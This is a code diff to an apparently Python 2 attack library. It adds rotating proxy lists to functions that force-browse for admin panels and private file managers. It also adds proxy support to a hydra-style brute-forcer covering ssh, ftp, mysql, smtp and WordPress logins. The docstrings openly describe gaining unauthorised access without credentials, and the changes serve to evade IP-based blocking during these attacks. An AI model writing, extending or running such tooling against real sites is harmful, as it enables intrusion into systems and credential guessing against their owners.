@@ -45,7 +45,7 @@ def access(u,timeout=10,bypass=False,proxy=None):
    proxy='192.122.58.47:80'
 
 """
-def filemanager(u,logs=True,mapping=False,returning=False,timeout=10,proxy=None):
+def filemanager(u,logs=True,mapping=False,returning=False,timeout=10,proxy=None,proxies=None):
  '''
    if you are lucky and smart enough, using google dorking you can gain an unauthorised access to private file managers and manipulate files
    (delete, upload, edit...) and exploit this weakness on the security of the target for further purposes.
@@ -71,6 +71,8 @@ def filemanager(u,logs=True,mapping=False,returning=False,timeout=10,proxy=None)
  k=[]
  if proxy:
   proxy={'http':'http://'+proxy}
+ if proxies:
+  proxy={'http':'http://'+random.choice(proxies)}
  for i in manager:
   try:
    if u[len(u)-1]=='/':
@@ -98,7 +100,7 @@ def filemanager(u,logs=True,mapping=False,returning=False,timeout=10,proxy=None)
    pass
  if returning==True:
   return k
-def forcebrowsing(u,timeout=10,logs=True,returning=False,mapping=True,ext='php',proxy=None):
+def forcebrowsing(u,timeout=10,logs=True,returning=False,mapping=True,ext='php',proxy=None,proxies=None):
  '''
    this function is using "Forced Browsing" technique which is aim to access restricted areas without providing any credentials!!!
    it is used here to gain access to admin control panel by trying different possible combinations of links with the given URL.
@@ -129,6 +131,8 @@ def forcebrowsing(u,timeout=10,logs=True,returning=False,mapping=True,ext='php',
 '''
  if proxy:
   proxy={'http':'http://'+proxy}
+ if proxies:
+  proxy={'http':'http://'+random.choice(proxies)}
  l=[]
  if u[len(u)-1]=='/':
     u=u[0:len(u)-1]
@@ -178,7 +182,7 @@ def adminlogin(u,p,timeout=10,proxy=None):
  except:
   pass
  return False
-def adminpanel(u,logs=True,mapping=False,returning=False,ext='php',timeout=10,proxy=None):
+def adminpanel(u,logs=True,mapping=False,returning=False,ext='php',timeout=10,proxy=None,proxies=None):
  '''
    this function use a list of possible admin panel links with different extensions: php, asp, aspx, js, /, cfm, cgi, brf and html.
    
@@ -193,6 +197,8 @@ def adminpanel(u,logs=True,mapping=False,returning=False,ext='php',timeout=10,pr
  '''
  if proxy:
   proxy={'http':'http://'+proxy}
+ if proxies:
+  proxy={'http':'http://'+random.choice(proxies)}
  links=[]
  ext=ext.strip()
  if ext.lower()=="php":
@@ -365,7 +371,7 @@ def mysql(u,username='root',password=''):
  except Exception as e:
   pass
  return False
-def hydra(u,proto="ssh",p=22,wl=[],logs=True,returning=False,mapping=False,timeout=5,ehlo=False,helo=True,ttls=False):
+def hydra(u,proto="ssh",p=22,wl=[],logs=True,returning=False,mapping=False,timeout=5,ehlo=False,helo=True,ttls=False,proxy=None,proxies=None):
  '''
    this function is similar to hydra tool to bruteforce attacks on different ports.
 
@@ -397,8 +403,14 @@ def hydra(u,proto="ssh",p=22,wl=[],logs=True,returning=False,mapping=False,timeo
    print"[*]Trying: {}:{}".format(user,pwd)
   if (proto=="mysql"):
    r=s(u,user,pwd)
-  elif ((proto=="ftp")or(proto=="wp")):
+  elif (proto=="ftp"):
    r=s(u,username=user,password=pwd,timeout=timeout)
+  elif (proto=="wp"):
+   if proxy:
+    proxy={'http':'http://'+proxy}
+   if proxies:
+    proxy={'http':'http://'+random.choice(proxies)}
+   r=s(u,username=user,password=pwd,proxies=proxy,timeout=timeout)
   elif (proto=="smtp"):
    r=s(u,p,username=user,password=pwd,ehlo=ehlo,helo=helo,ttls=ttls)
   else:
